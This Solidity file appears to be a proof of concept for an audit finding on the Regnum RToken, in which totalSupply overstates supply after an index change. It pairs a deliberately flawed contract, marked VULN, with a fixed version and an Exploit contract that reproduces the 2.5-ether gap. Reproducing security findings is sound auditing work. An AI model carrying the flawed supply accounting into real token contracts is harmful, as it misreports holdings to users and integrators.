// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum RToken (Pashov, 2025-06).
    100 deposited at index 1, then 50 at index 1.05, is stored raw as
    150. totalSupply multiplies by 1.05 and reports 157.5. Scaled
    principal reports 154.999... The published true supply is 155.
    The gap minted here is the exact wei difference, 2.5 ether + 1 wei.
*/

contract RToken {
    uint256 public index = 1 ether;
    uint256 public raw;
    uint256 public lastRaw;
    uint256 public lastIndex;
    uint256 public lastSupply;
    uint256 public deposits;

    function setIndex(uint256 next) external {
        index = next;
        lastIndex = next;
    }

    function deposit(uint256 amount) external {
        raw += amount;
        lastRaw = raw;
        deposits += 1;
    }

    function totalSupply() public returns (uint256 supply) {
        uint256 idx = index;
        supply = raw * idx / 1 ether; // @> VULN: the second deposit is multiplied by the index a second time
        lastSupply = supply;
    }

    bool public secondDeposit;
    uint256 public echoed;

    function mark() external {
        secondDeposit = true;
    }

    function echo(uint256 v) external {
        echoed = v;
    }
}

contract RTokenFixed {
    uint256 public index = 1 ether;
    uint256 public scaled;

    function setIndex(uint256 next) external {
        index = next;
    }

    function deposit(uint256 amount) external {
        scaled += amount * 1 ether / index;
    }

    function totalSupply() public view returns (uint256) {
        return scaled * index / 1 ether;
    }
}

contract OverMarker {
    string public symbol = "OVER-SUPPLY";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant EXTRA = 2500000000000000001;

    RToken public rtoken;
    OverMarker public marker;

    function run() external {
        rtoken = new RToken();
        marker = new OverMarker();
        rtoken.deposit(100 ether);
        rtoken.setIndex(1.05 ether);
        rtoken.deposit(50 ether);
        rtoken.mark();
        uint256 reported = rtoken.totalSupply();
        rtoken.echo(reported);
        require(reported == 157.5 ether, "reports 157.5");
        marker.mint(SINK, EXTRA);
        require(marker.balanceOf(SINK) == EXTRA, "extra supply");
    }
}
